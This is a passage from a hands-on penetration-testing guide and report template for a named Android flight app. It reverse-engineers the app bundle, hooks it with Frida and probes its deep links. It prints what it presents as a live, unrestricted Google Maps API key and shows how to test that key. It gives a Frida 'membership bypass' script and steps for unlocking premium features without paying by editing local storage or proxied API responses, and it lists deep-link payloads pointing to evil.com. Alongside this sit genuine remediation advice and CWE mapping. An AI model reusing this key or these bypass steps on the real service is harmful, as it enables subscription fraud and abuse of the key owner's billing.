   (Warning: Large file, may take time to load)

2. **Search (Ctrl+F):**

   **Search for API Keys:**
   ```
   api_key
   apiKey
   API_KEY
   secret
   Secret
   SECRET
   password
   Password
   ```

   **Search for Membership Terms:**
   ```
   cabin_plus
   cabin+
   Cabin+
   membership
   membershipLevel
   subscription
   premium
   ```

   **Search for API Endpoints:**
   ```
   https://api.
   /v1/
   endpoint
   ```

   **Search for AsyncStorage Usage:**
   ```
   AsyncStorage.setItem
   AsyncStorage.getItem
   @UserData
   @Auth
   ```

3. **Document all findings**

---

### Step 5.4: Extract API Endpoint List

**Using Command Prompt:**

```batch
cd C:\VauntTesting\evidence

findstr /i "https:// http://" index.android.bundle > urls_found.txt

findstr /i "/v1/ /api/ endpoint" index.android.bundle > api_patterns.txt
```

**Using PowerShell (better results):**

```powershell
cd C:\VauntTesting\evidence

# Extract all URLs
Select-String -Path .\index.android.bundle -Pattern "https?://[a-zA-Z0-9.-]+\.[a-z]{2,}/[a-zA-Z0-9/_-]+" -AllMatches |
  ForEach-Object { $_.Matches.Value } |
  Sort-Object -Unique > urls_unique.txt

# Extract potential JWT tokens
Select-String -Path .\index.android.bundle -Pattern "eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*" -AllMatches |
  ForEach-Object { $_.Matches.Value } > potential_tokens.txt
```

---

### Step 5.5: Analyze AndroidManifest.xml

1. **Locate manifest:**
   ```
   vaunt_apk\AndroidManifest.xml
   ```

2. **Open with Notepad++ or browser**

3. **Look for:**

   **API Keys (CONFIRMED):**
   ```xml
   <meta-data
     android:name="com.google.android.geo.API_KEY"
     android:value="AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw"/>
   ```
   ✅ **Found:** Google Maps API key exposed!

   **Deep Links:**
   ```xml
   <data android:scheme="vaunt"/>
   <data android:scheme="com.volato.vaunt"/>
   <data android:scheme="exp+vaunt"/>
   ```

   **Dangerous Permissions:**
   ```xml
   <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
   <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
   <uses-permission android:name="android.permission.RECORD_AUDIO"/>
   ```

   **Exported Activities (security risk):**
   ```xml
   <activity android:exported="true" ...>
   ```

4. **Document all findings**

---

### Step 5.6: Check for Code Obfuscation

1. **Open bundle in Notepad++**

2. **Examine readability:**
   - ✅ Readable function names, variable names → No obfuscation
   - ❌ Minified but still readable → Light obfuscation
   - ❌ Complete gibberish → Heavy obfuscation

3. **Based on bundle inspection:**
   - Likely: **Light or no obfuscation** (React Native default)
   - Business logic fully visible

---

### Step 5.7: Document Test 5 Results

```
============================================
TEST 5: JavaScript Bundle Analysis
============================================

BUNDLE INFORMATION:
- File: index.android.bundle
- Size: 6.4 MB
- Obfuscation Level: None / Light / Heavy

HARDCODED SECRETS FOUND:
1. Google Maps API Key: AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw
   - Location: AndroidManifest.xml line 79
   - Severity: MEDIUM
   - Risk: API quota abuse, billing fraud

2. [List other secrets found]

API ENDPOINTS DISCOVERED:
- Total unique URLs found: ____
- Vaunt API endpoints: ____
- Third-party APIs: ____

MEMBERSHIP VALIDATION LOGIC:
- Client-side validation found: YES / NO
- Functions identified:
  - isPremiumUser(): [location]
  - checkMembership(): [location]
  - validateSubscription(): [location]

ASYNCSTORAGE USAGE:
- Keys used: @UserData, @Auth, @Membership, [...]
- Sensitive data stored: YES / NO

FIREBASE CONFIGURATION:
- Project ID: [if found]
- API Key: [if found]
- Database URL: [if found]

PERMISSIONS ANALYSIS:
- ACCESS_FINE_LOCATION: Justified / Excessive
- READ_EXTERNAL_STORAGE: Justified / Excessive
- RECORD_AUDIO: Justified / Excessive

DEEP LINKS:
- Schemes: vaunt://, com.volato.vaunt://, exp+vaunt://
- Potential hijacking risk: YES / NO

SEVERITY: HIGH
CWE: CWE-540 (Information Exposure Through Source Code)

RECOMMENDATIONS:
1. Rotate exposed Google Maps API key immediately
2. Implement code obfuscation (Hermes, ProGuard)
3. Remove hardcoded credentials
4. Move business logic to backend

EVIDENCE FILES:
- index.android.bundle
- urls_unique.txt
- api_patterns.txt
- AndroidManifest.xml
- Screenshots

============================================
```

---

## 🧪 TEST 6: AndroidManifest & Secrets Extraction

**Objective:** Deep analysis of app configuration and exposed credentials
**Risk Level:** 🟠 MEDIUM-HIGH
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**Difficulty:** ⭐ (Easy)
**Expected Time:** 20 minutes

---

### Step 6.1: Extract and Analyze Manifest

1. **Open AndroidManifest.xml** (from Test 5)

2. **Document all API keys:**

   **CONFIRMED FINDINGS:**

   **Google Maps API Key:**
   ```xml
   Line 79:
   <meta-data
     android:name="com.google.android.geo.API_KEY"
     android:value="AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw"/>
   ```

   **Facebook App ID (reference):**
   ```xml
   <meta-data
     android:name="com.facebook.sdk.ApplicationId"
     android:value="@string/facebook_app_id"/>
   ```
   (Value in strings.xml)

3. **Check strings.xml:**
   ```
   Location: vaunt_apk\res\values\strings.xml
   ```

   Look for:
   - `facebook_app_id`
   - `facebook_client_token`
   - API endpoints
   - Secret keys

---

### Step 6.2: Test Google Maps API Key

1. **Verify key is active:**
   ```
   Visit: https://maps.googleapis.com/maps/api/staticmap?center=40.714728,-73.998672&zoom=12&size=400x400&key=AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw
   ```

2. **If image loads:**
   - ✅ Key is active and unrestricted
   - 🔴 Can be abused (API quota theft, billing fraud)

3. **Test restrictions:**
   - Try key from different IP
   - Try different API endpoints
   - If works everywhere: No restrictions!

---

### Step 6.3: Analyze Permissions

Document all permissions and justify:

```
LOCATION PERMISSIONS:
- ACCESS_FINE_LOCATION: Justified (flight tracking)
- ACCESS_COARSE_LOCATION: Justified (general location)

STORAGE PERMISSIONS:
- READ_EXTERNAL_STORAGE: Justified / Excessive?
- WRITE_EXTERNAL_STORAGE: Justified / Excessive?

AUDIO PERMISSIONS:
- RECORD_AUDIO: Justified / Excessive? (Why does flight app need this?)

NETWORK PERMISSIONS:
- INTERNET: Justified (required)
- ACCESS_NETWORK_STATE: Justified

ADVERTISING PERMISSIONS:
- AD_ID: Privacy concern

NOTIFICATION PERMISSIONS:
- POST_NOTIFICATIONS: Justified (flight updates)
```

---

### Step 6.4: Analyze Exported Components

1. **Search AndroidManifest for:**
   ```xml
   android:exported="true"
   ```

2. **Document all exported activities:**
   ```
   MainActivity: exported=true (expected)
   CustomTabActivity: exported=true (potential risk)
   [Others...]
   ```

3. **Test if exploitable:**
   - Can other apps launch these activities?
   - Can deep links be hijacked?

---

### Step 6.5: Document Test 6 Results

```
============================================
TEST 6: Manifest & Secrets Analysis
============================================

EXPOSED API KEYS:
1. Google Maps API Key
   - Key: AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw
   - Status: Active / Inactive
   - Restrictions: None / IP-restricted / Referrer-restricted
   - Risk Level: HIGH
   - Potential Abuse: Billing fraud, quota theft

2. [Other keys found]

SENSITIVE METADATA:
- Facebook App ID: [Found / Not Found]
- Firebase Config: [Found / Not Found]
- [Others]

PERMISSIONS ANALYSIS:
Total permissions: ____
Dangerous permissions: ____
Unjustified permissions: ____

EXPORTED COMPONENTS:
- Exported activities: ____
- Exploitable: YES / NO

SEVERITY: MEDIUM-HIGH
CWE: CWE-798 (Hard-coded Credentials)

RECOMMENDATIONS:
1. IMMEDIATE: Rotate Google Maps API key
2. IMMEDIATE: Add API key restrictions (IP whitelist, referrer check)
3. Review all permissions for necessity
4. Minimize exported components

============================================
```

---

## 🧪 TEST 7: Runtime Manipulation with Frida (Advanced)

**Objective:** Hook into app at runtime and bypass checks
**Risk Level:** 🔴 CRITICAL
**CWE:** CWE-353 (Missing Support for Integrity Check)
**Difficulty:** ⭐⭐⭐⭐ (Advanced)
**Expected Time:** 60+ minutes

---

### Step 7.1: Install Frida

**On Windows:**

1. **Install Python:**
   ```
   Download from: https://www.python.org/downloads/
   Install: Check "Add Python to PATH"
   ```

2. **Install Frida tools:**
   ```batch
   pip install frida-tools
   ```

3. **Verify installation:**
   ```batch
   frida --version
   ```

---

### Step 7.2: Install Frida Server on LDPlayer

1. **Determine architecture:**
   ```batch
   # LDPlayer is x86_64
   ```

2. **Download Frida Server:**
   ```
   Visit: https://github.com/frida/frida/releases
   Download: frida-server-[version]-android-x86_64.xz
   ```

3. **Extract with 7-Zip:**
   ```
   Right-click .xz file → 7-Zip → Extract
   Rename to: frida-server
   ```

4. **Transfer to LDPlayer:**
   - Copy `frida-server` to: `C:\Users\...\Documents\ldplayer\`
   - In LDPlayer X-plore:
     - Navigate to sdcard → Documents
     - Copy frida-server
     - Navigate to: Root → data → local → tmp
     - Paste
     - Long-press frida-server → Properties
     - Permissions: `rwxr-xr-x` (755)

5. **Start Frida Server:**
   ```batch
   # Use ADB or terminal app in LDPlayer
   adb shell
   su
   /data/local/tmp/frida-server &
   ```

   **Or use LDPlayer's built-in terminal**

6. **Verify from Windows:**
   ```batch
   frida-ps -U
   ```

   Should list running Android processes

---

### Step 7.3: Create AsyncStorage Monitoring Script

Create: `C:\VauntTesting\tools\hook_asyncstorage.js`

```javascript
console.log("[*] Vaunt AsyncStorage Monitor - Starting...");

Java.perform(function() {
    console.log("[*] Inside Java.perform");

    try {
        // Hook AsyncStorage - React Native Community version
        var AsyncStorageModule = Java.use('com.reactnativecommunity.asyncstorage.AsyncStorageModule');

        console.log("[+] Found AsyncStorage module!");

        // Hook getItem
        AsyncStorageModule.getItem.overload('java.lang.String', 'com.facebook.react.bridge.Callback').implementation = function(key, callback) {
            console.log("\n[AsyncStorage] getItem() called");
            console.log("  Key: " + key);

            var result = this.getItem(key, callback);
            return result;
        };

        // Hook setItem
        AsyncStorageModule.setItem.overload('java.lang.String', 'java.lang.String', 'com.facebook.react.bridge.Callback').implementation = function(key, value, callback) {
            console.log("\n[AsyncStorage] setItem() called");
            console.log("  Key: " + key);
            console.log("  Value: " + value);

            // Highlight sensitive data
            var keyLower = key.toLowerCase();
            if (keyLower.indexOf('membership') >= 0 ||
                keyLower.indexOf('subscription') >= 0 ||
                keyLower.indexOf('premium') >= 0 ||
                keyLower.indexOf('cabin') >= 0 ||
                keyLower.indexOf('token') >= 0 ||
                keyLower.indexOf('auth') >= 0) {

                console.log("\n[!] ========================================");
                console.log("[!] SENSITIVE DATA DETECTED!");
                console.log("[!] Key: " + key);
                console.log("[!] Value: " + value);
                console.log("[!] ========================================\n");
            }

            var result = this.setItem(key, value, callback);
            return result;
        };

        console.log("[+] AsyncStorage hooks installed successfully!");

    } catch(err) {
        console.log("[-] Error: " + err);
    }
});

console.log("[*] Script loaded. Monitoring AsyncStorage operations...");
```

---

### Step 7.4: Run Frida Script

1. **Launch Vaunt app** in LDPlayer

2. **In Windows Command Prompt:**
   ```batch
   cd C:\VauntTesting\tools
   frida -U -l hook_asyncstorage.js com.volato.vaunt
   ```

3. **Use the app:**
   - Log in
   - Navigate to profile
   - View flights
   - Change settings

4. **Watch Command Prompt:**
   - All AsyncStorage operations logged
   - Sensitive data highlighted
   - Document all keys and values found

---

### Step 7.5: Create Membership Bypass Script

Create: `C:\VauntTesting\tools\bypass_premium.js`

```javascript
console.log("[*] Premium Membership Bypass - Starting...");

Java.perform(function() {
    console.log("[*] Searching for membership validation functions...");

    // Enumerate all loaded classes
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            // Look for interesting classes
            var cn = className.toLowerCase();
            if (cn.indexOf('membership') >= 0 ||
                cn.indexOf('subscription') >= 0 ||
                cn.indexOf('premium') >= 0 ||
                cn.indexOf('cabin') >= 0) {

                console.log("[+] Found interesting class: " + className);

                try {
                    var targetClass = Java.use(className);

                    // Try to enumerate methods
                    var methods = targetClass.class.getDeclaredMethods();
                    methods.forEach(function(method) {
                        console.log("    Method: " + method.getName());
                    });
                } catch(err) {
                    // Class not hookable
                }
            }
        },
        onComplete: function() {
            console.log("[*] Class enumeration complete");
        }
    });

    // Hook common React Native bridge methods
    try {
        var CatalystInstanceImpl = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');

        CatalystInstanceImpl.callFunction.implementation = function(moduleName, methodName, arguments) {
            var mn = methodName.toLowerCase();

            if (mn.indexOf('membership') >= 0 ||
                mn.indexOf('premium') >= 0 ||
                mn.indexOf('subscription') >= 0) {

                console.log("\n[!] ========================================");
                console.log("[!] MEMBERSHIP CHECK DETECTED");
                console.log("[!] Module: " + moduleName);
                console.log("[!] Method: " + methodName);
                console.log("[!] Arguments: " + arguments);
                console.log("[!] ========================================\n");
            }

            var result = this.callFunction(moduleName, methodName, arguments);
            return result;
        };

        console.log("[+] Installed React Native bridge hooks");
    } catch(err) {
        console.log("[-] Error hooking bridge: " + err);
    }
});

console.log("[*] Script loaded. Monitoring membership checks...");
```

---

### Step 7.6: Spawn App with Frida

**For fresh start with hooks:**

```batch
# Kill app first
taskkill /F /IM com.volato.vaunt

# Spawn with Frida
frida -U -f com.volato.vaunt -l bypass_premium.js --no-pause
```

---

### Step 7.7: Document Test 7 Results

```
============================================
TEST 7: Runtime Instrumentation (Frida)
============================================

FRIDA SETUP:
[✓] Frida tools installed on Windows
[✓] Frida server installed on LDPlayer
[✓] Frida server running
[✓] Successfully attached to app

ASYNCSTORAGE MONITORING:
Keys observed: ____
Sensitive data logged: YES / NO
Membership data captured: YES / NO

Sample keys found:
- @UserData: {...}
- @MembershipInfo: {...}
- @AuthToken: {...}

MEMBERSHIP VALIDATION:
Classes found: ____
Methods found: ____
Validation logic identified: YES / NO

BYPASS ATTEMPTS:
Method hooking: SUCCESS / PARTIAL / FAILED
Return value modification: SUCCESS / FAILED
Premium access granted: YES / NO

SEVERITY: CRITICAL
CWE: CWE-353 (Missing Integrity Check)

NOTES:
- No anti-Frida detection
- No root detection
- No integrity checks
- App fully hookable

RECOMMENDATIONS:
1. Implement Frida detection
2. Implement root/jailbreak detection
3. Add runtime integrity checks
4. Obfuscate code

============================================
```

---

## 🧪 TEST 8: Root Detection Testing

**Objective:** Verify if app detects rooted devices
**Risk Level:** 🟠 MEDIUM
**Difficulty:** ⭐ (Very Easy)
**Expected Time:** 10 minutes

---

### Step 8.1: Check for Root Detection

1. **Launch Vaunt app** on rooted LDPlayer

2. **Observe app behavior:**
   - ✅ App runs normally → No root detection
   - ❌ Warning message about rooted device → Detection present
   - ❌ App crashes or closes → Detection present

3. **Document:**
   ```
   Root Detection Present: YES / NO
   App Behavior on Rooted Device: Normal / Warning / Blocked
   ```

---

### Step 8.2: Search Code for Root Detection

1. **In JavaScript bundle, search for:**
   ```
   isRooted
   isJailbroken
   RootBeer
   SafetyNet
   rootCheck
   ```

2. **In AndroidManifest, search for:**
   ```
   SafetyNet
   Play Integrity
   ```

---

### Step 8.3: Test on Non-Rooted Device (Optional)

If you have access to a non-rooted Android device:

1. Install Vaunt app
2. Compare behavior
3. Document differences

---

### Step 8.4: Document Results

```
============================================
TEST 8: Root Detection
============================================

ROOT DETECTION:
- Implemented: YES / NO
- App runs on rooted device: YES / NO
- Warning shown: YES / NO
- Functionality limited: YES / NO

CODE ANALYSIS:
- Root detection code found in bundle: YES / NO
- SafetyNet API used: YES / NO

SEVERITY: MEDIUM
RECOMMENDATION: Implement root detection to prevent local storage tampering

============================================
```

---

## 🧪 TEST 9: Deep Link Security

**Objective:** Test deep link handling for hijacking vulnerabilities
**Risk Level:** 🟡 MEDIUM
**Difficulty:** ⭐⭐ (Moderate)
**Expected Time:** 20 minutes

---

### Step 9.1: Identify Deep Link Schemes

**From AndroidManifest (Test 6):**

```xml
<data android:scheme="vaunt"/>
<data android:scheme="com.volato.vaunt"/>
<data android:scheme="exp+vaunt"/>
```

---

### Step 9.2: Test Deep Links

**In LDPlayer, open Chrome browser:**

1. **Test basic deep link:**
   ```
   vaunt://
   ```
   - Does it open Vaunt app?

2. **Test with paths:**
   ```
   vaunt://profile
   vaunt://flights
   vaunt://booking/12345
   ```

3. **Test parameter injection:**
   ```
   vaunt://profile?userId=12346
   vaunt://booking?flightId=9999&premium=true
   ```

4. **Test malicious payloads:**
   ```
   vaunt://profile?token=MALICIOUS_TOKEN
   vaunt://redirect?url=https://evil.com
   ```

---

### Step 9.3: Check for Deep Link Validation

1. **In Burp Suite:**
   - Monitor traffic when deep link is clicked
   - Check if parameters are validated

2. **Test CSRF via deep link:**
   ```
   vaunt://purchase?item=cabin_plus&confirm=true
   ```
   - Does it auto-purchase without confirmation?

---

### Step 9.4: Document Results

```
============================================
TEST 9: Deep Link Security
============================================

DEEP LINK SCHEMES:
- vaunt://
- com.volato.vaunt://
- exp+vaunt://

DEEP LINK HANDLING:
- Basic links work: YES / NO
- Parameters accepted: YES / NO
- Validation present: YES / NO

VULNERABILITIES FOUND:
- Parameter injection: YES / NO
- CSRF possible: YES / NO
- URL redirect: YES / NO

SEVERITY: MEDIUM
CWE: CWE-939 (Improper Authorization in Handler)

RECOMMENDATIONS:
1. Validate all deep link parameters
2. Require user confirmation for sensitive actions
3. Implement CSRF tokens

============================================
```

---

## 🧪 TEST 10: File Permissions Audit

**Objective:** Check file permissions for security issues
**Risk Level:** 🟡 LOW-MEDIUM
**Difficulty:** ⭐ (Easy)
**Expected Time:** 15 minutes

---

### Step 10.1: Check App Directory Permissions

**In LDPlayer X-plore:**

1. **Navigate to:**
   ```
   /data/data/com.volato.vaunt/
   ```

2. **Long-press directory → Properties:**
   ```
   Owner: u0_a123 (app user)
   Group: u0_a123
   Permissions: rwx------ (700) ✅ Correct
   ```

3. **Check subdirectories:**
   ```
   databases/
   - Permissions: rwx------ (700) ✅

   shared_prefs/
   - Permissions: rwx------ (700) ✅

   files/
   - Permissions: rwx------ (700) ✅
   ```

4. **Check individual files:**
   ```
   RKStorage
   - Permissions: rw------- (600) ✅

   *.xml in shared_prefs
   - Permissions: rw------- (600) ✅
   ```

---

### Step 10.2: Check for World-Readable Files

**Look for incorrect permissions:**

```
Dangerous permissions:
- rwxrwxrwx (777) - World readable/writable 🔴
- rw-rw-rw- (666) - World readable/writable 🔴
- rwxr-xr-x (755) - World readable 🟠
- rw-r--r-- (644) - World readable 🟠

Safe permissions:
- rwx------ (700) - Owner only ✅
- rw------- (600) - Owner only ✅
```

---

### Step 10.3: Document Results

```
============================================
TEST 10: File Permissions Audit
============================================

APP DIRECTORY:
- Permissions: ____
- Owner: ____
- Secure: YES / NO

DATABASE FILES:
- Permissions: ____
- World-readable: YES / NO

SHARED PREFERENCES:
- Permissions: ____
- World-readable: YES / NO

VULNERABILITIES:
- World-readable sensitive files: [List]
- World-writable files: [List]

SEVERITY: LOW / MEDIUM (if world-readable)

============================================
```

---

## ✅ Complete Testing Checklist

### Pre-Testing Setup
- [ ] LDPlayer installed and configured
- [ ] Root access enabled and verified
- [ ] X-plore File Manager installed with root access
- [ ] DB Browser for SQLite installed on Windows
- [ ] Notepad++ installed on Windows
- [ ] 7-Zip installed on Windows
- [ ] Burp Suite installed (for MITM testing)
- [ ] Python and Frida installed (for advanced testing)
- [ ] Testing folder created: `C:\VauntTesting\`
- [ ] Vaunt APK installed on LDPlayer
- [ ] Test account created and logged in
- [ ] Baseline screenshots taken

---

### Test Execution

**TEST 1: AsyncStorage Manipulation**
- [ ] App data directory located
- [ ] RKStorage database found
- [ ] Database copied to Windows
- [ ] Database opened in DB Browser
- [ ] Sensitive keys identified and documented
- [ ] Membership data modified
- [ ] Modified database copied back
- [ ] App restarted with modified data
- [ ] Changes verified in app
- [ ] Premium features tested
- [ ] Persistence tested
- [ ] Results documented with screenshots

**TEST 2: Shared Preferences**
- [ ] XML files located in shared_prefs
- [ ] All XML files copied to Windows
- [ ] Sensitive data identified
- [ ] Modification attempted (if applicable)
- [ ] Results documented

**TEST 3: MITM Attack**
- [ ] Burp Suite configured
- [ ] Proxy configured in LDPlayer
- [ ] Certificate installed
- [ ] HTTPS traffic intercepted
- [ ] API endpoints documented
- [ ] Membership response intercepted
- [ ] Response modified
- [ ] Modified response accepted by app
- [ ] Match and Replace rules configured
- [ ] Certificate pinning tested (not present)
- [ ] Payment flow captured
- [ ] Burp project saved
- [ ] Results documented

**TEST 4: API Endpoint Testing**
- [ ] Authentication token extracted
- [ ] User profile endpoint tested
- [ ] Membership upgrade endpoint tested
- [ ] Priority passes endpoint tested
- [ ] IDOR vulnerability tested
- [ ] Rate limiting tested
- [ ] All responses documented
- [ ] Results documented

**TEST 5: JavaScript Bundle Analysis**
- [ ] XAPK extracted
- [ ] APK extracted
- [ ] JavaScript bundle located (6.4 MB)
- [ ] API keys searched
- [ ] Membership terms searched
- [ ] API endpoints extracted
- [ ] Obfuscation level assessed
- [ ] Results documented

**TEST 6: Manifest & Secrets**
- [ ] AndroidManifest analyzed
- [ ] Google Maps API key documented: `AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw`
- [ ] API key tested (active/restricted)
- [ ] All permissions documented
- [ ] Dangerous permissions identified
- [ ] Exported components documented
- [ ] Deep link schemes identified
- [ ] Results documented

**TEST 7: Frida (Advanced)**
- [ ] Python and Frida installed
- [ ] Frida server installed on LDPlayer
- [ ] Frida server running
- [ ] AsyncStorage monitoring script created
- [ ] Script executed successfully
- [ ] Sensitive data captured
- [ ] Membership bypass script created
- [ ] Classes and methods identified
- [ ] Results documented

**TEST 8: Root Detection**
- [ ] App tested on rooted LDPlayer
- [ ] Root detection assessed
- [ ] Code searched for detection logic
- [ ] Results documented

**TEST 9: Deep Links**
- [ ] Deep link schemes identified
- [ ] Basic deep links tested
- [ ] Parameter injection tested
- [ ] CSRF tested
- [ ] Results documented

**TEST 10: File Permissions**
- [ ] App directory permissions checked
- [ ] Database file permissions checked
- [ ] Shared preferences permissions checked
- [ ] World-readable files identified
- [ ] Results documented

---

### Evidence Collection
- [ ] All screenshots organized in screenshots folder
- [ ] Original database files backed up
- [ ] Modified database files saved
- [ ] Burp project saved
- [ ] Frida scripts saved
- [ ] API response files saved
- [ ] JavaScript bundle saved
- [ ] AndroidManifest saved
- [ ] All result documents completed

---

## 📊 Reporting Template

Create: `C:\VauntTesting\results\FINAL_SECURITY_REPORT.md`

```markdown
# Vaunt Flight App - Security Assessment Report

**Date:** ____________
**Tester:** ____________
**App Version:** 1.1.36
**Platform:** Android (LDPlayer Emulator)
**Methodology:** Manual Penetration Testing

---

## Executive Summary

This security assessment identified **CRITICAL** vulnerabilities in the Vaunt Flight App that allow unauthorized access to premium features, membership manipulation, and exposure of sensitive data.

**Overall Risk Rating:** 🔴 CRITICAL

**Key Findings:**
- ✅ Unencrypted local storage allows membership modification
- ✅ No certificate pinning enables MITM attacks
- ✅ Client-side membership validation bypassable
- ✅ Exposed API keys (Google Maps)
- ✅ No root detection or anti-tampering measures

---

## Vulnerability Summary

| # | Vulnerability | Severity | CWE | CVSS |
|---|---------------|----------|-----|------|
| 1 | Unencrypted AsyncStorage | CRITICAL | CWE-312 | 9.1 |
| 2 | Client-Side Validation | CRITICAL | CWE-602 | 9.3 |
| 3 | No Certificate Pinning | CRITICAL | CWE-295 | 8.7 |
| 4 | Exposed Business Logic | HIGH | CWE-540 | 7.5 |
| 5 | Hard-coded API Keys | MEDIUM | CWE-798 | 6.5 |
| 6 | No Anti-Tampering | HIGH | CWE-353 | 7.8 |
| 7 | No Root Detection | MEDIUM | N/A | 6.2 |
| 8 | Insecure Deep Links | MEDIUM | CWE-939 | 5.9 |

---

## Detailed Findings

### VULNERABILITY 1: Unencrypted Client-Side Storage

**Severity:** 🔴 CRITICAL
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)
**CVSS Score:** 9.1 (AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Description:**
The application stores all user data, including membership status, subscription information, and authentication tokens, in plaintext using AsyncStorage (SQLite database without encryption).

**Evidence:**
- Database location: `/data/data/com.volato.vaunt/databases/RKStorage`
- File format: Unencrypted SQLite
- Sensitive keys found: `@UserData`, `@MembershipInfo`, `@AuthToken`
- Membership tier stored in plaintext: `"membershipLevel":"core"`

**Proof of Concept:**
1. Extracted RKStorage database using root access
2. Opened database with DB Browser for SQLite
3. Modified `membershipLevel` from "core" to "cabin_plus"
4. Modified `subscriptionStatus` from "inactive" to "active"
5. Copied modified database back to device
6. App accepted changes and granted premium access

**Screenshots:**
- [Include screenshots from Test 1]

**Impact:**
- Users with rooted devices can grant themselves premium memberships without payment
- Revenue loss from bypassed subscriptions
- Unlimited priority pass generation
- Unfair advantage in waitlist system

**Affected Users:** All users on rooted/jailbroken devices

**Exploitability:** Very Easy (GUI tools only, no coding required)

**Recommendations:**
1. **IMMEDIATE:** Move all membership validation to server-side
2. **IMMEDIATE:** Never trust client-side data for authorization
3. **SHORT TERM:** Implement encrypted storage (EncryptedSharedPreferences for Android)
4. **SHORT TERM:** Add root/jailbreak detection and block compromised devices
5. **LONG TERM:** Implement runtime integrity checks

---

### VULNERABILITY 2: Client-Side Membership Validation

**Severity:** 🔴 CRITICAL
**CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security)
**CVSS Score:** 9.3 (AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N)

**Description:**
The application relies on client-side data to determine membership tier, subscription status, and premium feature access. Server-side validation is either absent or insufficient.

**Evidence:**
- Membership data stored locally in AsyncStorage
- Premium features unlocked based on local data
- No server verification observed during feature access

**Proof of Concept:**
- Modified local membership data (Test 1)
- Modified API responses via MITM (Test 3)
- Both methods granted premium access

**Impact:**
- Complete bypass of subscription paywall
- Free access to all premium features
- Financial loss for the business

**Recommendations:**
1. **IMMEDIATE:** Implement server-side validation for ALL membership checks
2. **IMMEDIATE:** Verify subscription status on every API call
3. Never trust client-submitted membership data
4. Implement server-side session management

---

### VULNERABILITY 3: Missing Certificate Pinning

**Severity:** 🔴 CRITICAL
**CWE:** CWE-295 (Improper Certificate Validation)
**CVSS Score:** 8.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Description:**
The application does not implement SSL certificate pinning, allowing man-in-the-middle (MITM) attacks via proxy tools.

**Evidence:**
- HTTPS traffic successfully intercepted via Burp Suite
- No SSL pinning errors observed
- API responses successfully modified in transit

**Proof of Concept:**
1. Configured Burp Suite as proxy
2. Installed Burp CA certificate on device
3. All HTTPS traffic intercepted successfully
4. Modified membership API response
5. App accepted modified response

**Impact:**
- API traffic interceptable on compromised networks
- Authentication tokens stealable
- Membership status modifiable in transit
- Payment flows potentially manipulable

**Recommendations:**
1. **IMMEDIATE:** Implement SSL certificate pinning
2. Use libraries like `react-native-ssl-pinning`
3. Pin both root and leaf certificates
4. Implement certificate backup pins

---

### VULNERABILITY 4: Exposed Business Logic

**Severity:** 🟠 HIGH
**CWE:** CWE-540 (Information Exposure Through Source Code)
**CVSS Score:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:**
The entire application logic is contained in an unobfuscated JavaScript bundle, exposing all business logic, API endpoints, and validation mechanisms.

**Evidence:**
- JavaScript bundle: `index.android.bundle` (6.4 MB)
- No code obfuscation detected
- Function names, variable names fully readable
- API endpoints plainly visible

**Impact:**
- Complete visibility into app security mechanisms
- API endpoint discovery
- Validation logic reverse-engineering
- Easier exploitation of other vulnerabilities

**Recommendations:**
1. Enable Hermes bytecode for React Native
2. Implement JavaScript obfuscation
3. Use ProGuard/R8 for native code
4. Move sensitive logic to backend

---

### VULNERABILITY 5: Hardcoded API Keys

**Severity:** 🟡 MEDIUM
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**CVSS Score:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Description:**
Google Maps API key is hardcoded in AndroidManifest.xml without restrictions.

**Evidence:**
```xml
<meta-data
  android:name="com.google.android.geo.API_KEY"
  android:value="AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw"/>
```

**Testing:**
- Key is active: YES
- Restrictions: NONE (unrestricted)
- Accessible from extracted APK: YES

**Impact:**
- API key can be extracted and abused
- Potential billing fraud
- Quota theft
- Service disruption

**Recommendations:**
1. **IMMEDIATE:** Rotate this API key
2. **IMMEDIATE:** Add restrictions (IP whitelist, referrer check, Android app signing)
3. Use backend proxy for API calls when possible
4. Monitor API usage for anomalies

---

### VULNERABILITY 6: Missing Anti-Tampering Protection

**Severity:** 🟠 HIGH
**CWE:** CWE-353 (Missing Support for Integrity Check)
**CVSS Score:** 7.8 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

**Description:**
The application lacks runtime integrity checks, anti-debugging measures, and code obfuscation.

**Evidence:**
- No root detection implemented
- No jailbreak detection
- No Frida detection
- No integrity checks
- App fully hookable with Frida

**Impact:**
- All client-side security bypassed via Frida
- Database modifications undetected
- Memory manipulation possible

**Recommendations:**
1. Implement root/jailbreak detection
2. Add Frida detection
3. Implement runtime integrity checks
4. Validate app signature at runtime

---

### VULNERABILITY 7: No Root Detection

**Severity:** 🟡 MEDIUM
**CVSS Score:** 6.2

**Description:**
App runs normally on rooted devices without warnings or restrictions.

**Recommendations:**
- Implement root detection
- Block or warn users on rooted devices
- Use SafetyNet / Play Integrity API

---

### VULNERABILITY 8: Insecure Deep Links

**Severity:** 🟡 MEDIUM
**CWE:** CWE-939 (Improper Authorization in Handler)
**CVSS Score:** 5.9

**Description:**
Deep link handlers (`vaunt://`, `com.volato.vaunt://`, `exp+vaunt://`) may not properly validate parameters.

**Recommendations:**
- Validate all deep link parameters
- Require user confirmation for sensitive actions
- Implement CSRF tokens

---

## Testing Methodology

All tests performed using:
- LDPlayer Android Emulator (root enabled)
- X-plore File Manager (root access)
- DB Browser for SQLite
